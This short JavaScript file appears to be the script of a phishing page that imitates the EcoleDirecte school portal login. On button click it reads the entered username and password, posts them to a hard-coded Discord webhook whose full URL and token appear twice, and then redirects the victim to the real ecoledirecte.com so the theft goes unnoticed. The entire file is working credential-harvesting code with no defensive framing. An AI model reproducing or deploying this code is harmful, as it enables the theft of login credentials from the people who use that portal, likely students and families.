//test

//Accept when pressing enter

//https://discord.com/api/webhooks/1242440635063996417/AE1eLQoaUqm-V-cLecVtoHpi1pFIIojiJ99ywZKKNIulg9MIAWHJS1EuR8OY1hacG2Wx
const url="https://discord.com/api/webhooks/1242440635063996417/AE1eLQoaUqm-V-cLecVtoHpi1pFIIojiJ99ywZKKNIulg9MIAWHJS1EuR8OY1hacG2Wx"

const button=document.getElementById("lilguy");
const username=document.getElementById("username");
const password=document.getElementById("password");

button.onclick=async function e(){

	const message={"content": "Received username: \""+username.value+"\" with password \""+password.value+"\"."}
	await fetch(url, {"method": "POST","headers": {"content-type": "application/json"},"body": JSON.stringify(message)});
	location.replace("https://www.ecoledirecte.com");
};